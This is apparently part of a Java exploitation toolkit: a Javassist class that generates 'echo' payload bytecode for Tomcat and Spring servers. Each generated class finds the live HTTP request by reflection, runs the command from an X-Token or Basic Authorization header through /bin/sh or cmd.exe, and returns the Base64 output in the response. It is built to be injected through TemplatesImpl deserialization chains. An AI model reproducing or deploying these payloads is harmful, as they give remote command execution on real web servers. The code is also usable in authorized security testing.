package com.xyuxu.javasec.core.generator;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import javassist.bytecode.ClassFile; // 引入这个

import java.util.*;

public class EchoByteCodeGenerator {

    public static List<String> getEchoTypeNames() {
        return Arrays.asList("TomcatEcho", "SpringEcho", "AllEcho","NoEcho");
    }

    public static Map<String, byte[]> generateAllEchos(boolean bypassJDK17) {
        Map<String, byte[]> echos = new HashMap<>();
        try {
            echos.put("TomcatEcho", generateTomcatEcho(bypassJDK17));
            echos.put("SpringEcho", generateSpringEcho(bypassJDK17));
            echos.put("AllEcho", generateAllEcho(bypassJDK17));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return echos;
    }

    public static byte[] getBytecode(String echoType,boolean bypassJDK17) throws Exception {
        switch (echoType) {
            case "TomcatEcho":
                return generateTomcatEcho(bypassJDK17);
            case "SpringEcho":
                return generateSpringEcho(bypassJDK17);
            case "AllEcho":
                return generateAllEcho(bypassJDK17);
            default:
                throw new IllegalArgumentException("Unknown Echo Type: " + echoType);
        }
    }

    private static ClassPool getClassPool() {

        ClassPool pool = new ClassPool(true);
        pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        return pool;

    }

    // =============================================================
    // 1. TomcatEcho
    // =============================================================
    public static byte[] generateTomcatEcho(boolean bypassJDK17) throws Exception {
        ClassPool pool = getClassPool();
        CtClass clazz = pool.makeClass("com.xyuxu.echo.Tomcat" + System.nanoTime());

        if (!bypassJDK17) {
            clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            insertAbstractMethods(clazz);
        }
        clazz.getClassFile().setMajorVersion(ClassFile.JAVA_8);

        String writeBody = "private static void writeBody(Object resp, byte[] bs) throws Exception {\n" +
                "    try {\n" +
                "        Class cls = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                "        Object bc = cls.newInstance();\n" +
                "        cls.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(bc, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{bc});\n" +
                "    } catch (Exception e) {\n" +
                "        Class cls = Class.forName(\"java.nio.ByteBuffer\");\n" +
                "        Object bb = (Object) cls.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(null, new Object[]{bs});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{bb});\n" +
                "    }\n" +
                "}";
        clazz.addMethod(CtMethod.make(writeBody, clazz));

        String getFV = "private static Object getFV(Object o, String s) throws Exception {\n" +
                "    java.lang.reflect.Field f = null;\n" +
                "    Class clazz = o.getClass();\n" +
                "    while(clazz != Object.class && clazz != null) {\n" +
                "        try { f = clazz.getDeclaredField(s); break; } catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); }\n" +
                "    }\n" +
                "    if(f == null) throw new NoSuchFieldException(s);\n" +
                "    f.setAccessible(true);\n" +
                "    return f.get(o);\n" +
                "}";
        clazz.addMethod(CtMethod.make(getFV, clazz));

        String constructor = "public TomcatEcho() throws Exception {\n" +
                "    boolean done = false;\n" +
                "    Thread[] threads = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "    if (threads != null) {\n" +
                "        for (int i = 0; i < threads.length; ++i) {\n" +
                "            Thread t = threads[i];\n" +
                "            if (t == null) continue;\n" +
                "            String name = t.getName();\n" +
                "            if (!name.contains(\"exec\") && name.contains(\"http\")) {\n" +
                "                Object target = getFV(t, \"target\");\n" +
                "                if (target instanceof Runnable) {\n" +
                "                    try { target = getFV(getFV(getFV(target, \"this$0\"), \"handler\"), \"global\"); } catch (Exception e) { continue; }\n" +
                "                    java.util.List processors = (java.util.List) getFV(target, \"processors\");\n" +
                "                    for (int j = 0; j < processors.size(); ++j) {\n" +
                "                        Object processor = processors.get(j);\n" +
                "                        Object req = getFV(processor, \"req\");\n" +
                "                        String cmd = (String) req.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(req, new Object[]{\"X-Token\"});\n" +
                "                        if (cmd != null && !cmd.isEmpty()) {\n" +
                "                            Object resp = req.getClass().getMethod(\"getResponse\", new Class[0]).invoke(req, new Object[0]);\n" +
                "                            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n" +
                "                            byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                            writeBody(resp, (\"$$$\" + java.util.Base64.getEncoder().encodeToString(result) + \"$$$\").getBytes());\n" +
                "                            done = true;\n" +
                "                        }\n" +
                "                        if (done) break;\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "            if (done) break;\n" +
                "        }\n" +
                "    }\n" +
                "}";
        clazz.addConstructor(CtNewConstructor.make(constructor, clazz));
        return clazz.toBytecode();
    }

    // =============================================================
    // 2. SpringEcho
    // =============================================================
    public static byte[] generateSpringEcho(boolean bypassJDK17) throws Exception {
        ClassPool pool = getClassPool();
        CtClass clazz = pool.makeClass("com.xyuxu.echo.Spring" + System.nanoTime());

        if (!bypassJDK17) {
            clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            insertAbstractMethods(clazz);
        }
        clazz.getClassFile().setMajorVersion(ClassFile.JAVA_8);

        String constructor = "public SpringEcho() throws Exception {\n" +
                "    try {\n" +
                "        Class holder = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
                "        Object attr = holder.getMethod(\"getRequestAttributes\", new Class[0]).invoke(null, new Object[0]);\n" +
                "        if (attr != null) {\n" +
                "            Object req = attr.getClass().getMethod(\"getRequest\", new Class[0]).invoke(attr, new Object[0]);\n" +
                "            Object resp = attr.getClass().getMethod(\"getResponse\", new Class[0]).invoke(attr, new Object[0]);\n" +
                "            String cmd = (String) req.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(req, new Object[]{\"X-Token\"});\n" +
                "            if (cmd != null && !cmd.isEmpty()) {\n" +
                "                String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n" +
                "                String result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "                java.io.PrintWriter writer = (java.io.PrintWriter) resp.getClass().getMethod(\"getWriter\", new Class[0]).invoke(resp, new Object[0]);\n" +
                "                writer.write(\"$$$\" + java.util.Base64.getEncoder().encodeToString(result.getBytes()) + \"$$$\");\n" +
                "                writer.flush();\n" +
                "            }\n" +
                "        }\n" +
                "    } catch (Exception e) {}\n" +
                "}";

        clazz.addConstructor(CtNewConstructor.make(constructor, clazz));
        return clazz.toBytecode();
    }

    // =============================================================
    // 3. AllEcho
    // =============================================================
    public static byte[] generateAllEcho(boolean bypassJDK17) throws Exception {
        ClassPool pool = getClassPool();
        CtClass clazz = pool.makeClass("com.xyuxu.echo.All" + System.nanoTime());

        if (!bypassJDK17) {
            clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            insertAbstractMethods(clazz);
        }
        clazz.getClassFile().setMajorVersion(ClassFile.JAVA_8);

        clazz.addField(CtField.make("static java.util.HashSet h = new java.util.HashSet();", clazz));
        clazz.addField(CtField.make("static boolean done = false;", clazz));

        String methodP = "private static void p(Object o, int depth){\n" +
                "    if(depth > 50 || done || o == null || h.contains(o)) return;\n" +
                "    h.add(o);\n" +
                "    try {\n" +
                "        if(o.getClass().getMethod(\"getHeader\", new Class[]{String.class}) != null) {\n" +
                "            String cmd = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"X-Token\"});\n" +
                "            if(cmd == null || cmd.isEmpty()) {\n" +
                "                String auth = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"Authorization\"});\n" +
                "                if(auth != null && auth.startsWith(\"Basic \")) {\n" +
                "                     cmd = new String(java.util.Base64.getDecoder().decode(auth.substring(6)));\n" +
                "                }\n" +
                "            }\n" +
                "\n" +
                "            if(cmd != null && !cmd.isEmpty()) {\n" +
                "                Object resp = o.getClass().getMethod(\"getResponse\", null).invoke(o, null);\n" +
                "                String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n" +
                "                String result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "                java.io.PrintWriter w = (java.io.PrintWriter) resp.getClass().getMethod(\"getWriter\", null).invoke(resp, null);\n" +
                "                w.write(\"$$$\" + java.util.Base64.getEncoder().encodeToString(result.getBytes()) + \"$$$\");\n" +
                "                w.flush();\n" +
                "                done = true;\n" +
                "            }\n" +
                "        }\n" +
                "    } catch (Throwable e) {}\n" +
                "\n" +
                "    if(!done) F(o, depth + 1);\n" +
                "}";

        String methodF = "private static void F(Object start, int depth){\n" +
                "    if(done || start == null) return;\n" +
                "    Class n = start.getClass();\n" +
                "    while (n != null && n != Object.class) {\n" +
                "        try {\n" +
                "            java.lang.reflect.Field[] fields = n.getDeclaredFields();\n" +
                "            for (int i = 0; i < fields.length; i++) {\n" +
                "                try {\n" +
                "                    fields[i].setAccessible(true);\n" +
                "                    Object o = fields[i].get(start);\n" +
                "                    if(o != null && !o.getClass().isArray()) p(o, depth);\n" +
                "                    else if(o != null && o.getClass().isArray()) {\n" +
                "                        Object[] objs = (Object[])o;\n" +
                "                        for(int j=0; j<objs.length; j++) p(objs[j], depth);\n" +
                "                    }\n" +
                "                } catch (Throwable e) {}\n" +
                "            }\n" +
                "        } catch (Throwable e) {}\n" +
                "        n = n.getSuperclass();\n" +
                "    }\n" +
                "}";

        clazz.addMethod(CtMethod.make("private static void F(Object s, int d){}", clazz));
        clazz.addMethod(CtMethod.make(methodP, clazz));
        clazz.removeMethod(clazz.getDeclaredMethod("F"));
        clazz.addMethod(CtMethod.make(methodF, clazz));
        clazz.addConstructor(CtNewConstructor.make("public AllEcho() { F(Thread.currentThread(), 0); }", clazz));
        return clazz.toBytecode();

    }


    private static void insertAbstractMethods(CtClass clazz) throws Exception {
        clazz.addMethod(CtMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));
        clazz.addMethod(CtMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i, com.sun.org.apache.xml.internal.serializer.SerializationHandler h) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));
    }



}